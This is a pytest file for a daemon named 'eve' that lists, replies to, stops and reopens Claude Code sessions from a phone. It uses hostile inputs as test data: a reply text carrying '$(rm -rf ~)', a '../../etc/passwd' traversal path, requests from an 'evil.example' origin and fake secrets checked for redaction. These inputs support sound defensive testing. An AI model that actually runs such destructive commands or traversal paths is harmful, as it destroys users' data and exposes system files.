    mac.claude(42, sid, task=task)
    now["t"] += work_sessions.GRACE_SECS + 1
    [row] = asyncio.run(work.list())[1]["sessions"]
    assert row["id"] == sid and row["can_reply"] is True and not work.records[sid].over
    table = work_sessions.process_table(mac.run)
    assert work_sessions.Seen(table, {}).complete() is False             # an unregistered session: never "ended"
    assert asyncio.run(work.stop(sid)) == (200, {"ok": True, "stopped": True})
    assert mac.killed == [(42, signal.SIGTERM)]


@pytest.mark.parametrize("args,want", [
    ("claude --resume 0f0e0d0c-0b0a-4908-8706-050403020100", "0f0e0d0c-0b0a-4908-8706-050403020100"),
    ("claude -r 0f0e0d0c-0b0a-4908-8706-050403020100 -- go", "0f0e0d0c-0b0a-4908-8706-050403020100"),
    ("claude --resume=0f0e0d0c-0b0a-4908-8706-050403020100", "0f0e0d0c-0b0a-4908-8706-050403020100"),
    # a fork made before 2026-10-26 is its own id, never the original's
    ("claude --resume 0f0e0d0c-0b0a-4908-8706-050403020100 --fork-session --session-id "
     "11111111-2222-4333-8444-555555555555", "11111111-2222-4333-8444-555555555555"),
    ("claude --resume 0f0e0d0c-0b0a-4908-8706-050403020100 --fork-session", ""),
    ("claude -- --resume 0f0e0d0c-0b0a-4908-8706-050403020100", ""),
    ("claude --resume", ""), ("claude --resume not-a-uuid", ""), ("claude", ""),
])
def test_named_session(args: str, want: str) -> None:
    assert work_sessions.named_session(args) == want


def test_where_reads_the_app_from_the_ancestors() -> None:
    mac = Mac()
    for pid, app in ((10, "Terminal"), (20, "Warp"), (30, "VS Code"), (40, "tmux")):
        mac.plain_claude(pid, app=app)
    table = work_sessions.process_table(mac.run)
    assert table is not None
    assert [work_sessions.where(p, table) for p in (10, 20, 30, 40)] == ["Terminal", "Warp", "VS Code", "tmux"]
    assert table[20].tty == "/dev/ttys002" and table[1].tty == ""
    mac.parents[30] = 30                                                # a loop never hangs
    table = work_sessions.process_table(mac.run)
    assert work_sessions.where(30, table) == "" and work_sessions.where(99, table) == ""
    assert work_sessions.where(None, table) == "" and work_sessions.where(10, None) == ""


def test_the_registry_is_complete_only_when_every_claude_is_in_it() -> None:
    sid = "0f0e0d0c-0b0a-4908-8706-050403020100"
    mac = Mac()
    mac.plain_claude(10)
    mac.procs[11] = "claude -p summarize this"                       # a one-shot run registers too (2.1.311)
    mac.procs[12] = "/home/o/.local/bin/claude --chrome-native-host"   # never a session: never counted
    reg = Registry()
    reg.add(sid, 10)
    reg.add("11111111-2222-4333-8444-555555555555", 11, status="busy")
    table = work_sessions.process_table(mac.run)
    assert work_sessions.Seen(table, reg.read()).complete() is True
    # an IDE's session (the SDK's flags) or a one-shot run that is not in it: an older Claude Code, so cannot tell
    mac.procs[15] = "claude --output-format stream-json --verbose --input-format stream-json"
    assert work_sessions.Seen(work_sessions.process_table(mac.run), reg.read()).complete() is False
    del mac.procs[15]
    mac.procs[16] = "claude -p summarize that"
    assert work_sessions.Seen(work_sessions.process_table(mac.run), reg.read()).complete() is False
    del mac.procs[16]
    mac.procs[14] = "/home/o/.local/share/claude/versions/2.1.311 --dangerously-skip-permissions"
    assert work_sessions.Seen(work_sessions.process_table(mac.run), reg.read()).complete() is False   # run by path
    del mac.procs[14]
    assert work_sessions.Seen(work_sessions.process_table(mac.run), reg.read()).complete() is True
    mac.plain_claude(13)                                             # an older Claude Code: not registered
    assert work_sessions.Seen(work_sessions.process_table(mac.run), reg.read()).complete() is False
    assert work_sessions.Seen(table, None).complete() is False        # a registry that could not be read
    assert work_sessions.Seen(None, reg.read()).complete() is False   # ps that failed


# ---- reply: the owner's words into any live session ---------------------------------------------------------------

OTHER = "11111111-2222-4333-8444-555555555555"


def test_a_live_session_in_warp_gets_the_words_through_its_socket(tmp_path: Path) -> None:
    """The owner's case (2026-10-26): his sessions run in Warp, which cannot be typed into, so the only way in was a
    fork in a new Terminal window. Now the words go into that session's own socket, and nothing opens."""
    reg = Registry()
    work, mac = make(tmp_path, reg=reg)
    mac.plain_claude(81, app="Warp")
    reg.add(OTHER, 81, status="idle")
    text = 'yes, and then "quote" $(rm -rf ~)\nsecond line'
    assert asyncio.run(work.reply(OTHER, text)) == (200, {"ok": True, "delivered": "now"})
    assert reg.sent == [(OTHER, text)]                                  # whole, lines kept: no shell, no tab
    assert mac.scripts == []
    reg.add(OTHER, 81, status="busy")
    assert asyncio.run(work.reply(OTHER, "and the docs")) == (200, {"ok": True, "delivered": "queued"})
    reg.add(OTHER, 81, status="waiting")                                 # on a question to its user: not read now
    assert asyncio.run(work.reply(OTHER, "and the tests")) == (200, {"ok": True, "delivered": "queued"})


@pytest.mark.parametrize("answer,want", [
    (Delivery("held"), (200, {"ok": True, "delivered": "held", "reason": work_sessions.HELD})),
    (Delivery("held", "Waiting for approval on the Mac; it expires in an hour."),
     (200, {"ok": True, "delivered": "held", "reason": "Waiting for approval on the Mac; it expires in an hour."})),
    (Delivery("refused"), (409, {"ok": False, "reason": work_sessions.REFUSED, "code": "refused"})),
    (Delivery("gone", "That session's socket is stale."),
     (409, {"ok": False, "reason": "That session's socket is stale.", "code": "gone"})),
    (Delivery("unsupported"), (409, {"ok": False, "reason": work_sessions.NO_SOCKET, "code": "no_socket"})),
    (Delivery("error"), (409, {"ok": False, "reason": work_sessions.UNREACHABLE, "code": "error"})),
])
def test_what_the_session_did_with_the_words_is_what_the_phone_is_told(tmp_path: Path, answer: Delivery,
                                                                      want: tuple[int, dict[str, Any]]) -> None:
    reg = Registry()
    work, mac = make(tmp_path, reg=reg)
    mac.plain_claude(81, app="Warp")
    reg.add(OTHER, 81)
    reg.answer[OTHER] = answer
    assert asyncio.run(work.reply(OTHER, "go on")) == want
    assert typed(mac) == [] and opened(mac) == []                       # never typed, never forked


def test_a_send_that_raises_is_an_error_never_a_crash(tmp_path: Path) -> None:
    reg = Registry()
    work, mac = make(tmp_path, reg=reg)
    mac.plain_claude(81)
    reg.add(OTHER, 81)

    async def broken(peer: Peer, text: str) -> Delivery:
        raise ConnectionResetError("boom")

    work._send = broken
    assert asyncio.run(work.reply(OTHER, "go"))[1]["code"] == "error"


def test_an_eve_session_with_no_socket_is_typed_into_by_its_live_tty(tmp_path: Path) -> None:
    """Found 2026-10-26: the recorded window id was another window's, and ttys are reused (two windows showed
    /dev/ttys000 at once, one live, one a dead shell). The tty is the claude process's now, from ps."""
    now = {"t": 1000.0}
    reg = Registry()
    work, mac = make(tmp_path, reg=reg, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]                      # Terminal said window 4321, /dev/ttys009
    mac.claude(42, sid, tty="ttys004")
    now["t"] += work_sessions.GRACE_SECS + 1
    mac.type_answer = (0, "ok 555")
    text = 'yes, and then "quote" $(rm -rf ~) \n second line'
    assert asyncio.run(work.reply(sid, text)) == (200, {"ok": True, "delivered": "typed"})
    script, args = mac.scripts[-1]
    assert script == work_sessions.TERMINAL_TYPE
    assert args == ("4321", "/dev/ttys004", 'yes, and then "quote" $(rm -rf ~) second line')   # one line
    assert "rm -rf" not in script and "quote" not in script
    assert (work.records[sid].window_id, work.records[sid].tty) == (555, "/dev/ttys004")
    assert reg.sent == []
    # with a socket, the same session takes the words there instead, never typed
    reg.add(sid, 42)
    assert asyncio.run(work.reply(sid, "more"))[1]["delivered"] == "now"
    assert reg.sent == [(sid, "more")] and len(typed(mac)) == 1
    # a stale socket falls back to the tab; a refusal does not
    reg.answer[sid] = Delivery("gone")
    assert asyncio.run(work.reply(sid, "again"))[1]["delivered"] == "typed"
    reg.answer[sid] = Delivery("refused")
    assert asyncio.run(work.reply(sid, "again"))[1]["code"] == "refused" and len(typed(mac)) == 2


def test_a_registered_session_with_no_socket_is_live_but_never_sent_to(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    reg = Registry()
    work, mac = make(tmp_path, reg=reg, clock=lambda: now["t"])
    mac.plain_claude(81, app="Warp")
    reg.add(OTHER, 81, socket=False)
    row = next(r for r in asyncio.run(work.list())[1]["sessions"] if r["id"] == OTHER)
    assert row["can_reply"] is False and row["where"] == "Warp" and row["can_continue"] is False
    assert asyncio.run(work.reply(OTHER, "hi")) == (409, {"ok": False, "reason": work_sessions.NO_SOCKET,
                                                          "code": "no_socket"})
    assert asyncio.run(work.continue_session(OTHER, "hi"))[1]["code"] == "no_socket"      # live: never reopened
    assert reg.sent == [] and mac.scripts == []
    assert work_sessions.Seen(work_sessions.process_table(mac.run), reg.read()).complete() is True
    sid = start(work, "hello")[1]["session"]["id"]                       # an eve session with no socket: its tab
    mac.claude(42, sid)
    reg.add(sid, 42, socket=False)
    now["t"] += work_sessions.GRACE_SECS + 1
    assert asyncio.run(work.reply(sid, "go"))[1]["delivered"] == "typed" and reg.sent == []


def test_the_typing_script_passes_over_a_tab_that_is_not_busy() -> None:
    """The script itself: a tab with the tty that is not busy (a dead shell's window showing a reused tty) is never
    typed into; the search goes on through every window."""
    script = work_sessions.TERMINAL_TYPE
    assert "if busy of t then" in script and 'set found to "idle"' in script and "every window" in script
    assert script.index("window id wid") < script.index("every window")          # the recorded window first
    assert "item 3 of argv" in script and "do script (item 3 of argv) in t" in script


def test_two_quick_sends_both_go_through_in_order(tmp_path: Path) -> None:
    """Owner, 2026-10-26: "double-send or triple-send, and it just catches things". No send is refused for another
    one in flight; sends to one session go out in the order they came."""
    reg = Registry()
    work, mac = make(tmp_path, reg=reg)
    mac.plain_claude(81, app="Warp")
    reg.add(OTHER, 81, status="busy")
    reg.delay["one"] = 0.05                                             # the first is slow to send

    async def both() -> list[tuple[int, dict[str, Any]]]:
        return await asyncio.gather(work.reply(OTHER, "one"), work.reply(OTHER, "two"), work.reply(OTHER, "three"))

    assert asyncio.run(both()) == [(200, {"ok": True, "delivered": "queued"})] * 3
    assert reg.sent == [(OTHER, "one"), (OTHER, "two"), (OTHER, "three")]
    assert work._order == {}                                            # the per-session locks are let go


def test_a_send_right_after_start_waits_for_the_session_to_come_up(tmp_path: Path) -> None:
    reg = Registry()
    work, mac = make(tmp_path, reg=reg)
    sid = start(work, "hello")[1]["session"]["id"]
    looks = {"n": 0}
    read = reg.read

    def coming_up() -> Optional[dict[str, Peer]]:
        looks["n"] += 1
        if looks["n"] == 3:                                             # claude is up, then its socket
            mac.claude(42, sid)
        if looks["n"] == 5:
            reg.add(sid, 42, status="busy")
        return read()

    work._peers = coming_up
    assert asyncio.run(work.reply(sid, "and the docs")) == (200, {"ok": True, "delivered": "queued"})
    assert reg.sent == [(sid, "and the docs")] and typed(mac) == []


def test_a_reply_is_refused_when_the_session_is_not_live_or_not_reachable(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    state = State()
    work, mac = make(tmp_path, state=state, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    assert asyncio.run(work.reply(sid, "hi")) == (409, {"ok": False, "reason": work_sessions.STARTING,
                                                         "code": "starting"})   # waited, claude never came up
    now["t"] += work_sessions.GRACE_SECS + 1
    ended = (409, {"ok": False, "reason": work_sessions.ENDED, "code": work_sessions.ENDED_CODE})
    assert asyncio.run(work.reply(sid, "hi")) == ended
    assert asyncio.run(work.reply(sid, "hi")) == ended
    sid2 = start(work, "again")[1]["session"]["id"]
    mac.claude(43, sid2)
    now["t"] += work_sessions.GRACE_SECS + 1
    before = len(mac.scripts)
    mac.ps_fails = True                                              # cannot tell: never type
    no_window = (409, {"ok": False, "reason": work_sessions.NO_WINDOW, "code": "no_window"})
    assert asyncio.run(work.reply(sid2, "hi")) == no_window
    mac.ps_fails = False
    mac.type_answer = (0, "idle")                                    # a shell holds the tab: never type into it
    assert asyncio.run(work.reply(sid2, "hi")) == no_window
    mac.type_answer = (0, "gone")
    assert asyncio.run(work.reply(sid2, "hi"))[0] == 409
    assert len(mac.scripts) == before + 2                             # only the two the probe allowed were tried
    # a session eve did not start, with no messaging socket (an older Claude Code)
    state.session_start(OTHER, cwd=str(tmp_path / "eve"))
    state.sessions[OTHER].started_at = now["t"]
    assert asyncio.run(work.reply(OTHER, "hi")) == (409, {"ok": False, "reason": work_sessions.NO_SOCKET,
                                                          "code": "no_socket"})
    assert asyncio.run(work.reply("99999999-2222-4333-8444-555555555555", "hi"))[0] == 404
    mac.type_answer = (0, "ok 4321")
    assert asyncio.run(work.reply(sid2, "  "))[0] == 400
    assert asyncio.run(work.reply(sid2, None))[0] == 400
    assert asyncio.run(work.reply(sid2, "x" * 4001))[0] == 400
    assert asyncio.run(work.reply(sid2, "fine")) == (200, {"ok": True, "delivered": "typed"})   # positive control


# ---- stop ----------------------------------------------------------------------------------------------------

def test_stop_signals_only_that_sessions_process_and_is_idempotent(tmp_path: Path) -> None:
    state = State()
    reg = Registry()
    work, mac = make(tmp_path, state=state, reg=reg)
    a = start(work, "one")[1]["session"]["id"]
    b = start(work, "two")[1]["session"]["id"]
    mac.claude(100, a)
    mac.claude(200, b)
    mac.plain_claude(300)                                            # the owner's own session
    reg.add(OTHER, 300)
    state.session_start(a, cwd=str(work.root))
    assert asyncio.run(work.stop(a)) == (200, {"ok": True, "stopped": True})
    assert mac.killed == [(100, signal.SIGTERM)]
    assert work.records[a].stopped and a not in state.sessions
    assert not (tmp_path / "home" / "work" / f"{a}.mcp.json").exists()
    assert not work.check_token(a, "anything")
    assert asyncio.run(work.stop(a)) == (200, {"ok": True, "stopped": True})          # again: still fine
    assert mac.killed == [(100, signal.SIGTERM)]
    assert 200 in mac.procs and 300 in mac.procs
    assert asyncio.run(work.reply(a, "hi"))[0] == 409
    assert asyncio.run(work.stop(OTHER)) == (409, {"ok": False, "reason": work_sessions.NOT_OURS})   # not eve's
    assert asyncio.run(work.stop("99999999-2222-4333-8444-555555555555"))[0] == 404
    assert mac.killed == [(100, signal.SIGTERM)]


def test_a_session_that_ignores_sigterm_gets_sigkill(tmp_path: Path) -> None:
    work, mac = make(tmp_path)
    sid = start(work, "one")[1]["session"]["id"]
    mac.claude(100, sid)
    mac.dies_on_term = False
    assert asyncio.run(work.stop(sid))[0] == 200
    assert mac.killed == [(100, signal.SIGTERM), (100, signal.SIGKILL)]


def test_secrets_are_masked() -> None:
    text = ("token sk-proj-" + "x" * 30 + " GITHUB_TOKEN='abc' password: hunter2 Bearer " + "q" * 30
            + " key AKIAABCDEFGHIJKLMNOP and " + "a1" * 25)
    out = work_sessions.redact(text)
    for bad in ("sk-proj-", "abc'", "hunter2", "q" * 30, "AKIAABCD", "a1" * 25):
        assert bad not in out, bad
    assert work_sessions.redact("plain words, a path /tmp/x and the number 12345") == \
        "plain words, a path /tmp/x and the number 12345"


# ---- the routes ----------------------------------------------------------------------------------------------

SID = "0f0e0d0c-0b0a-4908-8706-050403020100"


def test_every_session_route_needs_the_link_token_and_no_origin(tmp_path: Path) -> None:
    reg = Registry()
    work, mac = make(tmp_path, reg=reg)
    mac.plain_claude(81)
    reg.add(SID, 81)

    async def go() -> None:
        server, port, token = await serve(tmp_path, FakeInlet(store_at(tmp_path)), work=lambda: work)
        doors = (("GET", link_chat.SESSIONS_PATH, None), ("POST", link_chat.SESSION_START_PATH, {"task": "hi"}),
                 ("GET", f"{link_chat.SESSIONS_PATH}/{SID}", None),
                 ("POST", f"{link_chat.SESSIONS_PATH}/{SID}/reply", {"text": "hi"}),
                 ("POST", f"{link_chat.SESSIONS_PATH}/{SID}/stop", None),
                 ("POST", f"{link_chat.SESSIONS_PATH}/{SID}/continue", {"text": "hi"}))
        for method, path, body in doors:
            assert (await http(port, method, path, body))[0] == 401, path
            assert (await http(port, method, path, body, token=token[:-1]))[0] == 401, path
            assert (await http(port, method, path, body, token=token, origin="https://evil.example"))[0] == 403, path
            assert (await http(port, method, path, body, token=token, origin="null"))[0] == 403, path
        assert mac.scripts == [] and work.records == {} and reg.sent == []     # nothing was started or sent
        status, _, raw = await http(port, "POST", link_chat.SESSION_START_PATH, {"task": "hi", "client_id": "a"},
                                    token=token)                          # positive control
        assert status == 200 and json.loads(raw)["session"]["state"] == "starting"
        status, _, raw = await http(port, "POST", f"{link_chat.SESSIONS_PATH}/{SID}/reply", {"text": "hi"},
                                    token=token)
        assert status == 200 and json.loads(raw) == {"ok": True, "delivered": "now"} and reg.sent == [(SID, "hi")]
        await server.close()

    asyncio.run(go())


def test_the_routes_shapes_wrong_methods_and_unknown_paths(tmp_path: Path) -> None:
    state = State()
    work, mac = make(tmp_path, state=state)

    async def go() -> None:
        server, port, token = await serve(tmp_path, FakeInlet(store_at(tmp_path)), work=lambda: work)
        status, headers, raw = await http(port, "POST", link_chat.SESSION_START_PATH,
                                          {"task": "Tidy the notes", "client_id": "c1"}, token=token)
        assert status == 200 and headers["content-type"] == "application/json"
        sid = json.loads(raw)["session"]["id"]
        mac.claude(9, sid)
        listed = json.loads((await http(port, "GET", link_chat.SESSIONS_PATH, token=token))[2])
        assert listed["ok"] is True and [s["id"] for s in listed["sessions"]] == [sid]
        detail = json.loads((await http(port, "GET", f"{link_chat.SESSIONS_PATH}/{sid}", token=token))[2])
        assert detail["ok"] is True and detail["turns"] == [] and detail["session"]["id"] == sid
        status, _, raw = await http(port, "POST", f"{link_chat.SESSIONS_PATH}/{sid}/reply", {"text": "go on"},
                                    token=token)
        assert status == 200 and json.loads(raw) == {"ok": True, "delivered": "typed"}
        assert mac.scripts[-1][1][2] == "go on"
        assert (await http(port, "POST", f"{link_chat.SESSIONS_PATH}/{sid}/stop", token=token))[0] == 200
        assert mac.killed == [(9, signal.SIGTERM)]
        status, _, raw = await http(port, "POST", f"{link_chat.SESSIONS_PATH}/{sid}/reply", {"text": "more"},
                                    token=token)
        assert status == 409 and json.loads(raw)["code"] == work_sessions.ENDED_CODE
        for method, path in (("POST", link_chat.SESSIONS_PATH), ("GET", link_chat.SESSION_START_PATH),
                             ("POST", f"{link_chat.SESSIONS_PATH}/{sid}"),
                             ("GET", f"{link_chat.SESSIONS_PATH}/{sid}/reply"),
                             ("GET", f"{link_chat.SESSIONS_PATH}/{sid}/stop")):
            assert (await http(port, method, path, {} if method == "POST" else None, token=token))[0] == 405, path
        for path in (f"{link_chat.SESSIONS_PATH}/not-a-uuid", f"{link_chat.SESSIONS_PATH}/{sid}/kill",
                     f"{link_chat.SESSIONS_PATH}/{sid.upper()}", f"{link_chat.SESSIONS_PATH}/../../etc"):
            assert (await http(port, "GET", path, token=token))[0] == 404, path
        assert (await http(port, "POST", link_chat.SESSION_START_PATH, b"[1, 2]", token=token))[0] == 400
        assert (await http(port, "POST", link_chat.SESSION_START_PATH, {"task": ""}, token=token))[0] == 400
        await server.close()

    asyncio.run(go())


def test_work_off_is_a_503_on_every_route(tmp_path: Path) -> None:
    async def go() -> None:
        for work in (None, lambda: None):
            kw = {} if work is None else {"work": work}
            server, port, token = await serve(tmp_path / str(id(work)), FakeInlet(store_at(tmp_path)), **kw)
            for method, path, body in (("GET", link_chat.SESSIONS_PATH, None),
                                       ("POST", link_chat.SESSION_START_PATH, {"task": "hi"}),
                                       ("POST", f"{link_chat.SESSIONS_PATH}/{SID}/reply", {"text": "x"}),
                                       ("POST", f"{link_chat.SESSIONS_PATH}/{SID}/continue", {"text": "x"})):
                status, _, raw = await http(port, method, path, body, token=token)
                assert status == 503 and json.loads(raw) == {"ok": False, "error": link_chat.NO_WORK}
            await server.close()

    asyncio.run(go())


def test_the_switch() -> None:
    assert work_sessions.enabled({}) and work_sessions.enabled({"EVE_WORK_SESSIONS": "1"})
    for off in ("0", "off", "false", "no"):
        assert not work_sessions.enabled({"EVE_WORK_SESSIONS": off})


# ---- continue: a reply to a live session, the same session reopened when it has ended ----------------------------

def trust(tmp_path: Path, *folders: Path) -> None:
    state = tmp_path / "claude" / ".claude.json"
    state.parent.mkdir(parents=True, exist_ok=True)
    got = json.loads(state.read_text()) if state.exists() else {"projects": {}}
    for f in folders:
        got["projects"][str(f)] = {"hasTrustDialogAccepted": True}
    state.write_text(json.dumps(got))


def adopted(tmp_path: Path, state: State, folder: str = "eve", *, ended: bool = True) -> tuple[Path, Path]:
    """A session the daemon adopted from a tool hook after a restart: a cwd, no transcript_path. Its transcript is
    where Claude Code writes it. Claude has been trusted in the folder above it. ``ended``: it started long ago, and
    Claude Code's registry (empty) no longer lists it."""
    cwd = tmp_path / "code" / folder
    cwd.mkdir(parents=True, exist_ok=True)
    trust(tmp_path, tmp_path / "code")
    state.session_start(OTHER, cwd=str(cwd))
    if ended:
        state.sessions[OTHER].started_at = 0.0
    path = transcript(work_sessions.derived_transcript(cwd, OTHER, tmp_path / "claude"), [
        line("user", "Make the hooks fast"), line("assistant", [{"type": "text", "text": "Ported them to Rust."}])])
    return cwd, path


def test_an_adopted_session_without_a_transcript_path_shows_its_turns(tmp_path: Path) -> None:
    state = State()
    work, _ = make(tmp_path, state=state)
    _, path = adopted(tmp_path, state, ended=False)
    assert state.sessions[OTHER].transcript_path is None
    status, out = asyncio.run(work.detail(OTHER))
    assert status == 200
    assert [(t["role"], t["text"]) for t in out["turns"]] == [("owner", "Make the hooks fast"),
                                                               ("claude", "Ported them to Rust.")]
    assert out["ended"] is False and out["session"]["can_continue"] is False      # live: never reopened
    row = next(r for r in asyncio.run(work.list())[1]["sessions"] if r["id"] == OTHER)
    assert row["last_line"] == "Ported them to Rust." and row["can_continue"] is False
    # a cwd that does not map to the transcript's folder (a symlink, a renamed folder): found by id in any project
    moved = tmp_path / "claude" / "projects" / "-somewhere-else" / f"{OTHER}.jsonl"
    moved.parent.mkdir(parents=True)
    path.rename(moved)
    assert len(asyncio.run(work.detail(OTHER))[1]["turns"]) == 2
    assert work_sessions.found_transcript(None, "../../etc/passwd", tmp_path / "claude") is None


def test_the_derived_path_turns_every_non_alphanumeric_into_a_dash(tmp_path: Path) -> None:
    got = work_sessions.derived_transcript(Path("/tmp/claude-501/my_proj v2"), "abc", tmp_path)
    assert got == tmp_path / "projects" / "-tmp-claude-501-my-proj-v2" / "abc.jsonl"


def test_continue_to_a_live_session_is_a_reply_never_a_fork_or_a_window(tmp_path: Path) -> None:
    """2026-10-26, twice: "Continue" forked a live, busy session into a new Terminal window, and the fork redid the
    original's unfinished work beside it in the same repository."""
    state = State()
    reg = Registry()
    work, mac = make(tmp_path, state=state, reg=reg)
    adopted(tmp_path, state)
    mac.plain_claude(81, app="Warp")
    reg.add(OTHER, 81, status="busy", cwd=str(tmp_path / "code" / "eve"))
    status, out = asyncio.run(work.continue_session(OTHER, "and the README too", "k-1"))
    assert status == 200 and out["ok"] is True and out["delivered"] == "queued"
    assert out["session"]["id"] == OTHER and out["session"]["where"] == "Warp" and out["session"]["can_reply"]
    assert reg.sent == [(OTHER, "and the README too")]
    assert mac.scripts == [] and work.records == {}                       # no window, no fork, no new session
    assert asyncio.run(work.continue_session(OTHER, "and the README too", "k-1")) == (status, out)   # a retry
    assert reg.sent == [(OTHER, "and the README too")]                     # sent once
    # an eve session that runs: the same, into its socket
    sid = start(work, "hello")[1]["session"]["id"]
    mac.claude(42, sid)
    reg.add(sid, 42)
    assert asyncio.run(work.continue_session(sid, "go on"))[1]["delivered"] == "now"
    assert len(opened(mac)) == 1                                            # only the start opened a window


@pytest.mark.parametrize("text", HOSTILE[:3])
def test_continue_reopens_an_ended_session_as_itself_in_its_own_folder(tmp_path: Path, text: str) -> None:
    state = State()
    work, mac = make(tmp_path, state=state)
    cwd, path = adopted(tmp_path, state)
    status, out = asyncio.run(work.continue_session(OTHER, text, "c-1"))
    assert status == 200 and out["ok"] is True and out["delivered"] == "resumed"
    assert out["session"]["id"] == OTHER                                    # the same session, not a new one
    assert out["session"]["from_work"] is True and out["session"]["folder"] == "eve" and out["session"]["can_stop"]
    [(script, (cmd,))] = mac.scripts
    assert script == work_sessions.TERMINAL_OPEN
    assert cmd == f"cd {shlex.quote(str(cwd))} && exec {shlex.quote(PYTHON)} -P -m eve_bridge.work_sessions resume {OTHER}"
    for word in text.split():
        if len(word) > 3:
            assert word not in cmd, word
    argv = launched(tmp_path, OTHER, "resume")
    mcp = tmp_path / "home" / "work" / f"{OTHER}.mcp.json"
    assert argv == ["/usr/local/bin/claude", "--dangerously-skip-permissions", "--mcp-config", str(mcp),
                    "--resume", OTHER, "--", text.strip()]
    assert "--fork-session" not in argv and "--session-id" not in argv
    assert work.records[OTHER].transcript_path == str(path)                 # the same transcript
    # ps names it by its own id, so reply and stop reach it; a retry of the same send opens nothing
    mac.claude(70, OTHER, resume=True)
    assert work_sessions.session_pids(mac.run) == {OTHER: 70}
    assert asyncio.run(work.continue_session(OTHER, text, "c-1"))[1]["session"]["id"] == OTHER
    assert len(opened(mac)) == 1
    assert asyncio.run(work.reply(OTHER, "and the tests"))[0] == 200
    reloaded = WorkSessions(root=tmp_path / "personal" / "work", home=tmp_path / "home", osascript=_never, environ={})
    assert reloaded.records[OTHER].cwd == str(cwd) and reloaded.records[OTHER].resumed_from == OTHER
    assert asyncio.run(work.stop(OTHER))[0] == 200 and mac.killed == [(70, signal.SIGTERM)]


def test_continue_is_refused_when_it_cannot_reopen_or_cannot_tell(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    state = State()
    reg = Registry()
    work, mac = make(tmp_path, state=state, reg=reg, clock=lambda: now["t"])
    assert asyncio.run(work.continue_session(OTHER, "go"))[0] == 404             # unknown
    state.session_start(OTHER, cwd=str(tmp_path / "gone"))                      # no folder, no transcript
    state.sessions[OTHER].started_at = 0.0
    assert asyncio.run(work.continue_session(OTHER, "go")) == (409, {"ok": False, "reason": work_sessions.NO_CONTINUE,
                                                                       "code": "no_resume"})
    state.session_end(OTHER)
    adopted(tmp_path, state)
    for bad in ("", "  ", None, 3, "x" * 4001):
        assert asyncio.run(work.continue_session(OTHER, bad))[0] == 400
    assert asyncio.run(work.continue_session(OTHER, "go", "c" * 65))[0] == 400
    # an interactive claude that is not in Claude Code's registry (an older version) could be this session: eve
    # cannot tell, so it never reopens it
    unsure = (409, {"ok": False, "reason": work_sessions.UNSURE, "code": "unsure"})
    mac.procs[91] = "claude --output-format stream-json --verbose --input-format stream-json"   # an IDE's, too
    assert asyncio.run(work.continue_session(OTHER, "go")) == unsure
    del mac.procs[91]
    mac.plain_claude(90)
    assert asyncio.run(work.continue_session(OTHER, "go")) == unsure
    work._live = lambda: {str(tmp_path / "code" / "eve"): True}           # and one runs in its very folder
    assert asyncio.run(work.continue_session(OTHER, "go")) == unsure
    work._live = lambda: {str(tmp_path / "elsewhere"): True}              # none in its folder: it has ended
    assert asyncio.run(work.continue_session(OTHER, "go"))[1]["delivered"] == "resumed"
    work.records.clear()
    # a registry that cannot be read is "cannot tell" too
    reg.fails = True
    work._live = lambda: None
    assert asyncio.run(work.continue_session(OTHER, "go")) == unsure
    # a live eve session that ps cannot see: never reopened
    reg.fails = False
    del mac.procs[90]
    live = start(work, "hello")[1]["session"]["id"]
    mac.claude(5, live)
    now["t"] += work_sessions.GRACE_SECS + 1
    mac.ps_fails = True
    assert asyncio.run(work.continue_session(live, "go")) == unsure
    assert len(opened(mac)) == 2                                                # the reopen above and the start
    mac.ps_fails = False
    assert asyncio.run(work.continue_session(live, "go"))[1]["delivered"] == "typed"   # live: a reply


def test_an_ended_work_session_reopens_as_itself_in_the_work_folder(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello", "first")[1]["session"]["id"]
    root = tmp_path / "personal" / "work"
    transcript(work_sessions.derived_transcript(root, sid, tmp_path / "claude"),
               [line("user", "hello"), line("assistant", [{"type": "text", "text": "Done."}])])
    trust(tmp_path, root)
    now["t"] += work_sessions.GRACE_SECS + 1                                    # claude exited
    out = asyncio.run(work.detail(sid))[1]
    assert out["ended"] is True and out["session"]["can_continue"] is True
    token_before = work.records[sid].token_hash
    status, got = asyncio.run(work.continue_session(sid, "one more thing", "second"))
    assert status == 200 and got["session"] == {**got["session"], "id": sid, "title": "hello", "folder": "work",
                                                "state": "starting"}
    assert mac.scripts[-1][1][0] == (f"cd {shlex.quote(str(root))} && exec {shlex.quote(PYTHON)} "
                                     f"-P -m eve_bridge.work_sessions resume {sid}")
    rec = work.records[sid]
    assert not rec.over and rec.token_hash != token_before and list(work.records) == [sid]
    assert (tmp_path / "home" / "work" / f"{sid}.task").read_text() == "one more thing"
    # a reopened session that has not come up yet takes a send, which waits for it
    mac.claude(11, sid, resume=True)
    assert asyncio.run(work.reply(sid, "and then"))[1]["delivered"] == "typed"


def test_an_ended_work_session_the_owner_reopened_at_the_mac_is_never_reopened_again_or_stopped(tmp_path: Path) -> None:
    """eve ended its record, then the owner ran ``claude --resume <id>`` in Warp himself: the same id runs again, so a
    send goes into its socket, a continue is a reply (never a second agent), and stop is not eve's."""
    now = {"t": 1000.0}
    reg = Registry()
    work, mac = make(tmp_path, reg=reg, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    root = tmp_path / "personal" / "work"
    transcript(work_sessions.derived_transcript(root, sid, tmp_path / "claude"), [line("user", "hello")])
    trust(tmp_path, root)
    now["t"] += work_sessions.GRACE_SECS + 1
    assert asyncio.run(work.detail(sid))[1]["ended"] is True and work.records[sid].over
    mac.claude(31, sid, resume=True, app="Warp", tty="ttys004")
    reg.add(sid, 31, name="hello", cwd=str(root))
    [row] = asyncio.run(work.list())[1]["sessions"]
    assert row == {**row, "id": sid, "where": "Warp", "from_work": False, "can_reply": True, "can_stop": False,
                   "can_continue": False}
    out = asyncio.run(work.detail(sid))[1]
    assert out["ended"] is False and out["session"]["can_reply"] is True and out["session"]["can_stop"] is False
    assert asyncio.run(work.reply(sid, "and then"))[1]["delivered"] == "now"
    status, got = asyncio.run(work.continue_session(sid, "one more"))
    assert status == 200 and got["delivered"] == "now" and got["session"]["id"] == sid
    assert len(opened(mac)) == 1 and typed(mac) == []                     # only the first start opened a window
    assert reg.sent == [(sid, "and then"), (sid, "one more")]
